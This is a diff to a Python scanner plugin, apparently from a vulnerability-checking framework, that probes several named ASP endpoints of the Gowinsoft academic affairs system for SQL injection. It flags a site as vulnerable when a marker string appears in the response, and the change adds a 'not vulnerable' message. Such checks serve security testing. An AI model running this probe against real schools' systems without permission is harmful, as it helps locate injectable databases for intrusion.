@@ -26,15 +26,18 @@ class gowinsoft_jw_multi_sqli_BaseVerify:
                 "/jiaoshi/xueji/dangan/sdangangai1.asp?id=1",
                 "/jiaoshi/xueji/shen/autobh.asp?jh=1"]
         vulnurl = self.url + payload
+        noexist = True
         try:
             for turl in urls:
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"GAO JI@Microsoft" in req.text:
                     cprint("[+]存在金窗教务系统存在多处SQL注射漏洞...(高危)\tpayload: "+vulnurl, "red")
-
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在gowinsoft_jw_multi_sqli漏洞", "white", "on_grey")
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
